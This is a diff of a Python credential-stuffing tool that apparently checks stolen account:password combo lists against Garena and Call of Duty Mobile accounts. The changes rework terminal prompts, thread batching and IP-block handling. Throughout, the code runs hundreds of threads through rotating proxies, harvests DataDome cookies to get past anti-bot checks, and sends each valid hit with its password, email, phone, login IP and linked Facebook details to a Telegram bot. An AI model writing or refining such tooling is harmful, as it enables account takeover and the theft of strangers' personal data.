@@ -4254,11 +4254,11 @@ def bulk_check(bulk_mode: str = 'full'):
     file_viewer.display_file_table(file_infos)
     selected_file = file_viewer.prompt_file_selection(file_infos)
     if file_viewer.prompt_clean_file():
-        with console.status('[bright_cyan]  ↺  Cleaning file encoding…[/bright_cyan]', spinner='dots'):
+        with console.status('[cyan]  ↺  Cleaning file encoding…[/cyan]', spinner='dots'):
             valid_count, invalid_count = file_manager.clean_file_encoding(selected_file)
         _log('SUCCESS', f'Cleaned: [bold]{valid_count}[/bold] valid, [bright_red]{invalid_count}[/bright_red] removed')
     if file_viewer.prompt_remove_duplicates():
-        with console.status('[bright_cyan]  ↺  Removing duplicates…[/bright_cyan]', spinner='dots'):
+        with console.status('[cyan]  ↺  Removing duplicates…[/cyan]', spinner='dots'):
             removed = file_manager.clean_duplicates(selected_file)
         _log('SUCCESS', f'Removed [bold]{removed}[/bold] duplicate(s)')
     auto_remove = file_viewer.prompt_auto_remove_checked()
@@ -4266,9 +4266,9 @@ def bulk_check(bulk_mode: str = 'full'):
         _log('INFO', '[dim]Auto-remove enabled.[/dim]')
 
     global HARVEST_COOKIES
-    prompt_harvest = Panel("[white]Harvest valid cookies to fetch_cookie.txt? (y/n) [default: n][/white]", title="[bright_magenta]❯ Question[/bright_magenta]", border_style="bright_magenta", box=box.ROUNDED, expand=False)
-    rprint(Padding(prompt_harvest, (0, 0, 0, 4)))
-    HARVEST_COOKIES = input("        ❯ ").strip().lower() == 'y'
+    _prompt_box('[white]Harvest datadome cookies while checking? (y/N)[/white]',
+                '❯ Cookie Harvest', border='bright_cyan')
+    HARVEST_COOKIES = input("    ❯ ").strip().lower() == 'y'
     if HARVEST_COOKIES:
         _log('SUCCESS', 'Cookie harvesting enabled.', '    ')
 
@@ -4289,9 +4289,9 @@ def bulk_check(bulk_mode: str = 'full'):
         file_table = Table(show_header=False, box=None, padding=(0, 1), expand=False)
         file_table.add_column(style='dim', width=12, no_wrap=True)
         file_table.add_column(style='bright_white', no_wrap=True)
-        file_table.add_row('File', f'[bright_cyan]{Path(selected_file).name}[/bright_cyan]')
+        file_table.add_row('File', f'[cyan]{Path(selected_file).name}[/cyan]')
         file_table.add_row('Accounts', f'[bold bright_white]{len(accounts):,}[/bold bright_white]')
-        console.print(Panel(file_table, title='[bold bright_green]✔ FILE LOADED[/bold bright_green]', border_style='bright_magenta', box=CARD, padding=(0, 2), expand=False, width=60))
+        console.print(Panel(file_table, title='[bold bright_green]✔ FILE LOADED[/bold bright_green]', border_style='bright_green', box=box.ROUNDED, padding=(0, 2), expand=False, width=60))
     except Exception:
         _log('ERROR', 'Could not read file.')
         return
@@ -4303,7 +4303,7 @@ def bulk_check(bulk_mode: str = 'full'):
     info_table.add_column(style='bright_white', no_wrap=True)
     info_table.add_row('Total Queued', f'[bold bright_white]{len(accounts):,}[/bold bright_white]')
     info_table.add_row('Status', '[bright_green]Ready[/bright_green]')
-    console.print(Panel(info_table, title='[bold bright_cyan]ℹ ACCOUNT QUEUE[/bold bright_cyan]', border_style='bright_magenta', box=CARD, padding=(0, 2), expand=False, width=50))
+    console.print(Panel(info_table, title='[bold bright_green]ℹ ACCOUNT QUEUE[/bold bright_green]', border_style='bright_green', box=box.ROUNDED, padding=(0, 2), expand=False, width=50))
     results_manager = ResultsManager(selected_file)
     cookie_manager = CookieManager()
     datadome_manager = DataDomeManager()
@@ -4317,32 +4317,18 @@ def bulk_check(bulk_mode: str = 'full'):
     else:
         _log('INFO', '[dim]Direct connection (no proxies)[/dim]')
     print()
-    def _vis_len(s: str) -> int:
-        import re
-        return len(re.sub(r"\033\[[0-9;]*m", "", s))
-    def _make_box(color: str, width: int) -> tuple:
-        top = f"  {color}┏{'━' * (width + 2)}┓{_RST}"
-        divider = f"  {color}┣{'━' * (width + 2)}┫{_RST}"
-        bottom = f"  {color}┗{'━' * (width + 2)}┛{_RST}"
-        return top, divider, bottom
-    def _box_line(color: str, content: str, width: int) -> str:
-        pad = width - _vis_len(content)
-        return f"  {color}┃{_RST} {content}{' ' * max(pad, 0)} {color}┃{_RST}"
-    term_width = shutil.get_terminal_size((80, 20)).columns
     max_threads = 1000 if using_proxy else 1000
-    width = min(max(term_width - 6, 40), 56)
-    top, divider, bottom = _make_box(_CY, width)
-    print(top)
-    print(_box_line(_CY, f"{_BRT}{_WH}⧫  THREAD SELECTOR{_RST}", width))
-    print(divider)
-    print(_box_line(_CY, f"{_GN}5–15{_RST}    {_DIM}Safe{_RST}  {_DIM}(recommended){_RST}", width))
-    print(_box_line(_CY, f"{_YL}17–19{_RST}   {_DIM}Medium speed{_RST}", width))
-    print(_box_line(_CY, f"{_CY}23–100{_RST}  {_DIM}Fast{_RST}" if not using_proxy else f"{_CY}21–100{_RST}  {_DIM}Fast — proxy only{_RST}", width))
-    print(bottom)
     print()
+    _tc_body = (f'[white]30-80[/white] [dim]direct[/dim]   '
+                f'[yellow]80-150[/yellow] [dim]balanced[/dim]   '
+                f'[bright_green]350+[/bright_green] [dim]proxy[/dim]\n'
+                f'[dim]default:[/dim] [bold white]{DEFAULT_THREADS}[/bold white]   '
+                f'[dim]max:[/dim] [bold white]{max_threads}[/bold white]')
+    _prompt_box(_tc_body, '◆ THREAD CONFIG',
+                border='bright_yellow', box_style=box.ROUNDED)
     while True:
         try:
-            raw = input(f"  {_CY}❯{_RST} Threads 1-{max_threads} {_DIM}(default {DEFAULT_THREADS}){_RST} {_CY}❯{_RST} ").strip()
+            raw = input(f"    \033[93m❯\033[0m threads 1-{max_threads} \033[2m(enter={DEFAULT_THREADS})\033[0m: ").strip()
             num_threads = DEFAULT_THREADS if not raw else int(raw)
             if 1 <= num_threads <= max_threads:
                 break
@@ -4352,16 +4338,12 @@ def bulk_check(bulk_mode: str = 'full'):
     _log("SUCCESS", f"Running with {_BRT}{num_threads}{_RST} thread(s)")
     print()
     global CHECK_OTHER_GAMES
-    width_g = min(max(term_width - 6, 40), 60)
-    top_g, divider_g, bottom_g = _make_box(_MG, width_g)
-    print(top_g)
-    print(_box_line(_MG, f"{_BRT}{_WH}◇  GAME CONNECTIONS{_RST}", width_g))
-    print(divider_g)
-    print(_box_line(_MG, f"{_WH}Check OTHER GAMES{_RST}  {_DIM}(AOV / ROV / FF / Delta Force…){_RST}", width_g))
-    print(_box_line(_MG, f"{_DIM}Saves each game to separate file  ·  Adds ~1-3s per account{_RST}", width_g))
-    print(bottom_g)
-    print()
-    CHECK_OTHER_GAMES = input(f"  {_MG}◇{_RST}  Check other games? (y/N) {_CY}❯{_RST} ").strip().lower() == "y"
+    _og_body = ('[white]Check other Garena games[/white]  '
+                '[dim]AOV / ROV / Free Fire / Delta Force…[/dim]\n'
+                '[dim]Saves each game to a separate file  ·  ~1-3s/account[/dim]')
+    _prompt_box(_og_body, '◇ OTHER GAMES',
+                border='cyan', box_style=box.ROUNDED)
+    CHECK_OTHER_GAMES = input("    \033[96m❯\033[0m check other games? (y/N): ").strip().lower() == "y"
     _log("SUCCESS" if CHECK_OTHER_GAMES else "INFO", "Will scan all Garena game connections" if CHECK_OTHER_GAMES else f"{_DIM}CODM only — skipping other game checks{_RST}")
     print()
     _TG_CFG_FILE = os.path.join(_SCRIPT_DIR_COOKIE, '.tg_cfg')
@@ -4383,20 +4365,16 @@ def bulk_check(bulk_mode: str = 'full'):
         except Exception:
             return None
     _saved_tg = _tg_load()
-    width_tg = min(max(term_width - 6, 40), 54)
-    top_tg, divider_tg, bottom_tg = _make_box(_YL, width_tg)
-    print(top_tg)
-    print(_box_line(_YL, f"{_BRT}{_WH}⬡  TELEGRAM NOTIFICATION SETUP{_RST}", width_tg))
-    print(divider_tg)
-    print(_box_line(_YL, f"{_WH}1{_RST}  {_YL}›{_RST}  {_DIM}Send Clean hits only{_RST}", width_tg))
-    print(_box_line(_YL, f"{_WH}2{_RST}  {_YL}›{_RST}  {_DIM}Send Not-Clean hits only{_RST}", width_tg))
-    print(_box_line(_YL, f"{_WH}3{_RST}  {_YL}›{_RST}  {_DIM}Send Both (clean + not-clean){_RST}", width_tg))
-    print(_box_line(_YL, f"{_WH}4{_RST}  {_DIM}›  No Telegram (skip){_RST}", width_tg))
-    print(bottom_tg)
     print()
+    _tg_body = ('[bold white]1[/bold white]  [bright_green]›[/bright_green]  Send Clean hits only\n'
+                '[bold white]2[/bold white]  [yellow]›[/yellow]  Send Not-Clean hits only\n'
+                '[bold white]3[/bold white]  [bright_cyan]›[/bright_cyan]  Send Both (clean + not-clean)\n'
+                '[bold white]4[/bold white]  [dim]›[/dim]  No Telegram (skip)')
+    _prompt_box(_tg_body, '⬡ TELEGRAM NOTIFICATION SETUP',
+                border='bright_green', box_style=box.ROUNDED)
     tg_choice = ''
     while tg_choice not in ('1', '2', '3', '4'):
-        tg_choice = input(f'  {_YL}❯{_RST} ').strip()
+        tg_choice = input('    \033[92m❯\033[0m ').strip()
     TG_ENABLED = tg_choice != '4'
     TG_SEND_CLEAN = tg_choice in ('1', '3')
     TG_SEND_NOTCLEAN = tg_choice in ('2', '3')
@@ -4406,41 +4384,24 @@ def bulk_check(bulk_mode: str = 'full'):
     if TG_ENABLED:
         print()
         if _saved_tg:
-            width_sc = min(max(term_width - 6, 40), 80)
-            top_sc, divider_sc, bottom_sc = _make_box(_GN, width_sc)
-            print(top_sc)
-            print(_box_line(_GN, f"{_BRT}{_WH}✔  Saved config found{_RST}", width_sc))
-            print(divider_sc)
-            print(_box_line(_GN, f"{_DIM}Token: {_saved_tg['token']}{_RST}", width_sc))
-            print(_box_line(_GN, f"{_DIM}Chat ID: {_saved_tg['chat_id']}{_RST}", width_sc))
-            print(bottom_sc)
+            _log('SUCCESS', f"Saved config found — Token: {_saved_tg['token'][:12]}…  Chat: {_saved_tg['chat_id']}")
             print()
-            if input(f'  {_YL}❯ Use saved config? (y/n){_RST}  {_YL}❯{_RST} ').strip().lower() == 'y':
+            if input(f'  {_P}▸{_RST} use saved config? (Y/n): ').strip().lower() != 'n':
                 TG_BOT_TOKEN, TG_CHAT_ID = _saved_tg['token'], _saved_tg['chat_id']
                 _cr, _nr = _saved_tg.get('clean', [0, 9999]), _saved_tg.get('nc', [0, 9999])
                 TG_LVL_MIN_CLEAN, TG_LVL_MAX_CLEAN = (_cr[0], _cr[1]) if TG_SEND_CLEAN else (0, 9999)
                 TG_LVL_MIN_NOTCLEAN, TG_LVL_MAX_NOTCLEAN = (_nr[0], _nr[1]) if TG_SEND_NOTCLEAN else (0, 9999)
-                width_ok = min(max(term_width - 6, 30), 40)
-                top_ok, _, bottom_ok = _make_box(_GN, width_ok)
-                print(top_ok)
-                print(_box_line(_GN, f"{_BRT}{_WH}✔  Using saved config{_RST}", width_ok))
-                print(bottom_ok)
+                _log('SUCCESS', 'Using saved config')
                 print()
             else:
                 _saved_tg = None
         if not _saved_tg:
-            width_input = min(max(term_width - 6, 40), 50)
-            top_in, _, bottom_in = _make_box(_YL, width_input)
-            print(top_in)
-            print(_box_line(_YL, f"{_BRT}{_WH}Enter Telegram Credentials{_RST}", width_input))
-            print(bottom_in)
-            print()
-            TG_BOT_TOKEN = input(f'  {_YL}❯ Bot Token{_RST}  {_YL}❯{_RST} ').strip()
-            TG_CHAT_ID = input(f'  {_YL}❯ Chat ID{_RST}  {_YL}❯{_RST} ').strip()
+            _P = '\033[96m'
+            TG_BOT_TOKEN = input(f'  {_P}▸{_RST} bot token: ').strip()
+            TG_CHAT_ID = input(f'  {_P}▸{_RST} chat id: ').strip()
             if TG_SEND_CLEAN:
-                print()
-                print(f'  {_DIM}Level range for {_GN}CLEAN{_RST}{_DIM} hits — format: min-max (e.g. 50-400){_RST}')
-                raw_clean = input(f'  {_GN}❯ Clean level range (Enter = all){_RST}  {_GN}❯{_RST} ').strip()
+                print(f'    {_DIM}clean level range — min-max (e.g. 50-400), enter = all{_RST}')
+                raw_clean = input(f'  {_P}▸{_RST} clean range: ').strip()
                 if raw_clean and '-' in raw_clean:
                     try:
                         parts = raw_clean.split('-')
@@ -4448,9 +4409,8 @@ def bulk_check(bulk_mode: str = 'full'):
                     except Exception:
                         pass
             if TG_SEND_NOTCLEAN:
-                print()
-                print(f'  {_DIM}Level range for {_RD}NOT-CLEAN{_RST}{_DIM} hits — format: min-max (e.g. 1-200){_RST}')
-                raw_nc = input(f'  {_RD}❯ Not-clean level range (Enter = all){_RST}  {_RD}❯{_RST} ').strip()
+                print(f'    {_DIM}not-clean level range — min-max (e.g. 1-200), enter = all{_RST}')
+                raw_nc = input(f'  {_P}▸{_RST} nc range: ').strip()
                 if raw_nc and '-' in raw_nc:
                     try:
                         parts = raw_nc.split('-')
@@ -4475,7 +4435,6 @@ def bulk_check(bulk_mode: str = 'full'):
             _req.post(f'https://api.telegram.org/bot{token}/sendMessage', json=payload, timeout=8)
         except Exception:
             pass
-
     def _build_tg_message(acc, pwd, ad, is_clean_hit):
         lvl = ad.get('codm_level', 0)
         region = ad.get('codm_region', 'N/A')
@@ -4496,39 +4455,21 @@ def bulk_check(bulk_mode: str = 'full'):
         nickname = ad.get('nickname', 'N/A')
         bind_status = ad.get('bind_status', 'N/A')
         game_connections = ad.get('game_connections', [])
-        
-        status_text = 'CLEAN' if is_clean_hit else 'NOT CLEAN'
-        checked_time = ad.get('checked_time', datetime.now().strftime('%B %d, %Y | %I:%M %p'))
-        
-        fb_status = ad.get('fb_info', 'NOT CONNECTED')
-        if fb_status != 'NOT CONNECTED' and not fb_status:
-            fb_status = 'CONNECTED'
-
-        lines = [
-            '-------------------------------------------',
-            f' ꜱᴛᴀᴛᴜꜱ:  {status_text}',
-            f' 💎 ꜱʜᴇʟʟꜱ: {shell:,}',
-            '-------------------------------------------',
-            f' 🔑 ᴇᴍᴀɪʟ: {acc}',
-            f' 🔒 ᴘᴀꜱꜱ: {pwd}',
-            '-------------------------------------------',
-            f' 🎯 ɴɪᴄᴋɴᴀᴍᴇ: {nickname}',
-            f' 🆔 ᴜɪᴅ: {uid}',
-            f' ⭐ ʟᴇᴠᴇʟ: {lvl}',
-            f' 🌍 ʀᴇɢɪᴏɴ: {region}',
-            f' 🚩 ᴄᴏᴜɴᴛʀʏ: {country}',
-            '-------------------------------------------',
-            f' 🌐 ʟᴏɢɪɴ ᴠɪᴀ: {login_w}',
-            f' 📧 ᴇᴍᴀɪʟ: {email_d}',
-            f' 📱 ᴍᴏʙɪʟᴇ: {mobile}',
-            f' 📘 ꜰᴀᴄᴇʙᴏᴏᴋ: {fb_status}',
-            '-------------------------------------------',
-            f' ⏰ ᴄʜᴇᴄᴋᴇᴅ ᴛɪᴍᴇ: {checked_time}',
-            f' 🤖 ᴘᴏᴡᴇʀᴇᴅ ʙʏ: @zenix262',
-            '-------------------------------------------'
-        ]
+        tag = '✔ CLEAN' if is_clean_hit else '⊘ NOT CLEAN'
+        lines = [f"{'✔ CLEAN HIT' if is_clean_hit else '⊘ NOT CLEAN HIT'}", f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Account : {acc} : {pwd}', f'Status  : {tag}', f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Username    : {username}', f'Nickname    : {nickname}', f'UID         : {uid}', f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Email       : {email_d}', f'Mobile      : {mobile}', f'Facebook    : {fb}', f'FB Username : {fb_username}']
+        if fb_link != 'N/A':
+            lines.append(f'FB Link     : {fb_link}')
+        lines.extend([f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Shells      : {shell:,}', f'Bind Status : {bind_status}', f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'CODM Level  : {lvl}', f'CODM Region : {region}', f'CODM IGN    : {nick}', f'CODM UID    : {ad.get("codm_uid", "N/A")}', f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Country     : {country}', f'Last Login  : {login_d}', f'Login Via   : {login_w}', f'Login IP    : {login_ip}', f'Login Loc   : {login_country}'])
+        if game_connections and CHECK_OTHER_GAMES:
+            lines.append(f'━━━━━━━━━━━━━━━━━━━━━━━━━━')
+            lines.append(f'Game Connections:')
+            for g in game_connections:
+                gname = g.get('game', 'Unknown')
+                grole = g.get('role', 'N/A')
+                gregion = g.get('region', '')
+                lines.append(f'• {gname}: {grole} ({gregion})' if gregion else f'• {gname}: {grole}')
+        lines.extend([f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'✦  Powered by: @anon  ✦'])
         return '\n'.join(lines)
-
     def _maybe_send_tg(account_data):
         if account_data.get('is_error') or not account_data.get('has_codm'):
             return
@@ -4544,6 +4485,9 @@ def bulk_check(bulk_mode: str = 'full'):
                 threading.Thread(target=_send_tg, args=(TG_BOT_TOKEN, TG_CHAT_ID, msg, False), daemon=True).start()
     global _TG_HOOK
     _TG_HOOK = _maybe_send_tg
+    # ── Display mode: live feed handles results, dashboard only ─────
+    global _DISPLAY_MODE
+    _DISPLAY_MODE = 'dashboard'
     clear_screen()
     dashboard = BulkLiveDashboard(len(accounts), max_threads=num_threads)
     globals()['_dashboard_ref'] = dashboard
@@ -4552,6 +4496,11 @@ def bulk_check(bulk_mode: str = 'full'):
     account_index_counter = [0]
     index_lock = threading.Lock()
     stats_lock = threading.Lock()
+    # rriell-style: no deferred queue. IP_BLOCKED pauses on the shared event
+    # inside wait_for_ip_change; on timeout the account is recorded as an error
+    # and the run continues (never gets stuck).
+    _requeue = deque()          # kept for the pool-loop drain guard
+    requeue_lock = threading.Lock()
     global _suppress_ip_prints, _ip_block_callback
     _suppress_ip_prints = True
     def _ip_block_cb(blocked: bool):
@@ -4567,32 +4516,14 @@ def bulk_check(bulk_mode: str = 'full'):
             _thread_local.datadome = DataDomeManager()
             _thread_local.proxy_url = None
             _thread_local.proxy_line = None
-            
-            # --- PROXY LOGIC ---
-            if 'GLOBAL_PROXIES' in globals() and GLOBAL_PROXIES:
-                import random
-                proxy_string = random.choice(GLOBAL_PROXIES)
-                proxy = {"http": proxy_string, "https": proxy_string}
-                _thread_local.session.proxies.update(proxy)
-                _thread_local.proxy_url = proxy_string
-                _thread_local.proxy_line = 1
-                try:
-                    dashboard.set_current_proxy(proxy=_thread_local.proxy_url, line=_thread_local.proxy_line)
-                except Exception:
-                    pass
-            elif using_proxy and proxy_manager and proxy_manager.enabled:
+            if using_proxy and proxy_manager and proxy_manager.enabled:
                 proxy = proxy_manager.get_next()
                 if proxy:
                     _thread_local.session.proxies.update(proxy)
                     _thread_local.proxy_url = proxy.get('http') or proxy.get('https')
                     _thread_local.proxy_line = proxy_manager._index
-                    try:
-                        dashboard.set_current_proxy(proxy=_thread_local.proxy_url, line=_thread_local.proxy_line)
-                    except Exception:
-                        pass
-            # -------------------
-
-            proxy_dict = dict(_thread_local.session.proxies) if _thread_local.session.proxies else None
+                    dashboard.set_current_proxy(proxy=_thread_local.proxy_url, line=_thread_local.proxy_line)
+            proxy_dict = dict(_thread_local.session.proxies) if using_proxy and proxy_manager and proxy_manager.enabled else None
             picked_ck = cookie_manager.pick_cookie()
             if picked_ck:
                 applyck(_thread_local.session, picked_ck)
@@ -4606,8 +4537,6 @@ def bulk_check(bulk_mode: str = 'full'):
                     _thread_local.datadome.set_datadome(dd)
                     _thread_local.datadome.set_session_datadome(_thread_local.session, dd)
         return (_thread_local.session, _thread_local.datadome)
-
-
     def _worker(account_line):
         if ':' not in account_line:
             return ('DONE', account_line, {})
@@ -4630,9 +4559,38 @@ def bulk_check(bulk_mode: str = 'full'):
             dashboard.record_start(my_index, acc_name)
         except Exception:
             pass
+        def _record_error(reason):
+            # Terminal record for an account we gave up on — counted in live_stats
+            # AND saved to Results so it's never silently dropped. Left in the combo
+            # file (not auto-removed) since it was never actually verified.
+            nonlocal overall_done
+            acc, _sep, pwd = account_line.partition(':')
+            try:
+                live_stats.update_stats(is_error=True)
+                live_stats.push_result(success=False, error_reason=reason)
+                results_manager.add_account({'account': acc.strip(), 'password': pwd.strip(),
+                                             'is_error': True, 'error_reason': reason})
+            except Exception:
+                pass
+            dashboard.record(my_index, acc_name, success=False, error_reason=reason)
+            with stats_lock:
+                overall_done += 1
+        ip_change_tries = 0
         while True:
             status, acc_name, _ = _worker(account_line)
+            if status == 'IP_BLOCKED':
+                # Silently skip — don't add to feed, don't count as error.
+                # Account stays in combo file for a re-run.
+                with stats_lock:
+                    overall_done += 1
+                return
             if status == 'IP_CHANGED':
+                ip_change_tries += 1
+                # Safety cap so a stuck IP can't spin forever — same silent skip.
+                if ip_change_tries > 3:
+                    with stats_lock:
+                        overall_done += 1
+                    return
                 if hasattr(_thread_local, 'session'):
                     try:
                         _thread_local.session.close()
@@ -4647,7 +4605,7 @@ def bulk_check(bulk_mode: str = 'full'):
                         proxy_url = proxy.get('http') or proxy.get('https')
                         proxy_line = proxy_manager._index
                         dashboard.set_current_proxy(proxy=proxy_url, line=proxy_line)
-                time.sleep(0.8)
+                time.sleep(0.5)
                 continue
             break
         result_info = live_stats.pop_result()
@@ -4659,14 +4617,48 @@ def bulk_check(bulk_mode: str = 'full'):
         with stats_lock:
             overall_done += 1
     try:
+        # Stream-batch futures: keep at most 4× thread count in flight at
+        # any time. This avoids the memory churn of submitting 100k+ Future
+        # objects upfront, and lets the executor focus on actual work.
+        _IN_FLIGHT = num_threads * 4
         with ThreadPoolExecutor(max_workers=num_threads) as executor:
-            futures = {executor.submit(_wrapped_worker, ln): ln for ln in accounts}
-            for future in as_completed(futures):
+            pending = set()
+            acc_iter = iter(accounts)
+            def _next_line():
+                # Requeued (transient-failed) accounts take priority, then the
+                # fresh stream. None means nothing left to submit right now.
+                with requeue_lock:
+                    if _requeue:
+                        return _requeue.popleft()
                 try:
-                    future.result()
-                except Exception:
-                    with stats_lock:
-                        overall_done += 1
+                    return next(acc_iter)
+                except StopIteration:
+                    return None
+            # Prime the queue
+            for _ in range(min(_IN_FLIGHT, len(accounts))):
+                ln = _next_line()
+                if ln is None:
+                    break
+                pending.add(executor.submit(_wrapped_worker, ln))
+
+            # Keep going while work is in flight OR waiting to be requeued.
+            while pending or _requeue:
+                # Wait for at least one to complete, drain finished ones
+                from concurrent.futures import wait, FIRST_COMPLETED
+                done, pending = wait(pending, return_when=FIRST_COMPLETED, timeout=0.05)
+                # Re-fill the in-flight window
+                while len(pending) < _IN_FLIGHT:
+                    ln = _next_line()
+                    if ln is None:
+                        break
+                    pending.add(executor.submit(_wrapped_worker, ln))
+                # Reap results so exceptions don't get lost
+                for fut in done:
+                    try:
+                        fut.result()
+                    except Exception:
+                        with stats_lock:
+                            overall_done += 1
     except KeyboardInterrupt:
         _log('WARNING', 'Interrupted — shutting down...')
     finally:
@@ -4678,7 +4670,9 @@ def bulk_check(bulk_mode: str = 'full'):
     _flush_auto_remove(file_manager, selected_file, force=True)
     print(f'  {_DIM}Results saved in real-time to Results/{_RST}')
     print()
-    input(f'  {_DIM}Press Enter to return to menu{_RST} ')
+    input(f'  {_DIM}↵ menu{_RST} ')
+
+
 
 
 
